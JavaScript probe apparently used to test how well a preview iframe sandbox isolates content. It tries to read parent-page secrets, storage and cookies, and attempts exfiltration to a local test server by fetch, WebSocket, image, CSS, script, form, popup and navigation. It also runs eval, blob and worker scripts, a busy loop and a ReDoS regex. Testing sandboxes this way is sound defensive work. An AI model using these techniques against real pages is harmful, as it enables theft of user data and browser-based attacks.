(async () => {
  if (window.__probeStarted) return; window.__probeStarted = true;
  const r = {};
  const attempt = async (name, fn) => { try { r[name] = { ok: true, value: String(await fn()) }; } catch (e) { r[name] = { ok: false, error: `${e && e.name}: ${e && e.message}`.slice(0, 160) }; } };
  const timeout = (p, ms = 1500) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), ms))]);
  await attempt("selfOrigin", () => self.origin);
  await attempt("locationHref", () => location.href);
  await attempt("parentDocument", () => window.parent.document.getElementById("secret-heading").textContent);
  await attempt("parentAppState", () => window.parent.appState.secret);
  await attempt("parentLocationRead", () => window.parent.location.href);
  await attempt("parentLocalStorage", () => window.parent.localStorage.getItem("explain-dev:v1:preferences"));
  await attempt("ownLocalStorage", () => localStorage.getItem("explain-dev:v1:preferences"));
  await attempt("sessionStorage", () => sessionStorage.length);
  await attempt("indexedDB", () => new Promise((res, rej) => { const q = indexedDB.open("x"); q.onsuccess = () => res("opened"); q.onerror = () => rej(q.error); }));
  await attempt("cookie", () => JSON.stringify(document.cookie));
  await attempt("cookieWrite", () => { document.cookie = "evil=1"; return JSON.stringify(document.cookie); });
  await attempt("fetchSameApp", () => timeout(fetch("/parent.html?exfil=fetch-same").then((x) => x.status)));
  await attempt("fetchExternal", () => timeout(fetch("http://127.0.0.1:4802/?exfil=fetch-ext").then((x) => x.status)));
  await attempt("xhr", () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", "/?exfil=xhr"); x.onload = () => res(x.status); x.onerror = () => rej(new Error("xhr error")); x.send(); }));
  await attempt("sendBeacon", () => navigator.sendBeacon("/?exfil=beacon", "x"));
  await attempt("websocket", () => new Promise((res, rej) => { try { const w = new WebSocket("ws://127.0.0.1:4802/?exfil=ws"); w.onopen = () => res("open"); w.onerror = () => rej(new Error("ws error")); } catch (e) { rej(e); } }));
  await attempt("imgExternal", () => new Promise((res, rej) => { const i = new Image(); i.onload = () => res("loaded"); i.onerror = () => rej(new Error("img error")); i.src = "http://127.0.0.1:4802/?exfil=img"; }));
  await attempt("cssBackground", () => { const d = document.createElement("div"); d.style.backgroundImage = "url(http://127.0.0.1:4802/?exfil=css)"; document.body.append(d); return getComputedStyle(d).backgroundImage; });
  await attempt("scriptExternal", () => new Promise((res, rej) => { const s = document.createElement("script"); s.src = "http://127.0.0.1:4802/preview-probe.js?exfil=script"; s.onload = () => res("loaded"); s.onerror = () => rej(new Error("script error")); document.head.append(s); }));
  await attempt("inlineScriptAtLoad", () => String(window.__inlineRan === true));
  await attempt("inlineScriptInjected", () => { const s = document.createElement("script"); s.textContent = "window.__inj = true"; document.head.append(s); return String(window.__inj === true); });
  await attempt("blobScript", () => new Promise((res, rej) => { const u = URL.createObjectURL(new Blob(["window.__blobRan = 42"], { type: "text/javascript" })); const s = document.createElement("script"); s.src = u; s.onload = () => res(String(window.__blobRan)); s.onerror = () => rej(new Error("blob script error")); document.head.append(s); }));
  await attempt("eval", () => eval("1+1"));
  await attempt("newFunction", () => new Function("return 2")());
  await attempt("dynamicImportExternal", () => timeout(import("http://127.0.0.1:4802/preview-probe.js?exfil=import")));
  await attempt("dynamicImportBlob", () => timeout(import(URL.createObjectURL(new Blob(["export default 1"], { type: "text/javascript" }))).then((m) => m.default)));
  await attempt("dataScript", () => new Promise((res, rej) => { const s = document.createElement("script"); s.src = "data:text/javascript,window.__data=1"; s.onload = () => res("loaded"); s.onerror = () => rej(new Error("data script error")); document.head.append(s); }));
  await attempt("workerRuns", () => timeout(new Promise((res, rej) => { const w = new Worker(URL.createObjectURL(new Blob(["postMessage(\"worker-ran\")"], { type: "text/javascript" }))); w.onmessage = (e) => res(e.data); w.onerror = () => rej(new Error("worker error event")); })));
  await attempt("windowOpen", () => String(window.open("http://127.0.0.1:4802/?exfil=popup")));
  await attempt("alert", () => { const t = Date.now(); alert("x"); return `returned after ${Date.now() - t}ms`; });
  await attempt("formSubmit", () => { const f = document.createElement("form"); f.action = "http://127.0.0.1:4802/?exfil=form"; f.method = "get"; document.body.append(f); f.submit(); return "submitted"; });
  await attempt("broadcastChannel", () => { new BroadcastChannel("probe").postMessage("from-iframe"); return "posted"; });
  await attempt("topNavigation", () => { window.top.location.href = "http://127.0.0.1:4802/?exfil=topnav"; return "no throw"; });
  await attempt("serviceWorker", () => navigator.serviceWorker ? navigator.serviceWorker.register("/sw.js").then(() => "registered") : "unavailable");
  await attempt("sharedArrayBuffer", () => typeof SharedArrayBuffer);
  await attempt("crossOriginIsolated", () => String(self.crossOriginIsolated));
  window.parent.postMessage({ type: "probe-results", results: r }, "*");
  addEventListener("message", (e) => {
    if (e.data === "block") { const start = Date.now(), end = start + 3000; while (Date.now() < end) {} window.parent.postMessage({ type: "blocked-done", blockedMs: Date.now() - start }, "*"); }
    if (e.data === "navigate") { location.href = "http://127.0.0.1:4802/parent.html?exfil=selfnav"; }
    if (e.data === "regex") { /(a+)+$/.test("a".repeat(34) + "b"); window.parent.postMessage({ type: "regex-done" }, "*"); }
  });
})();
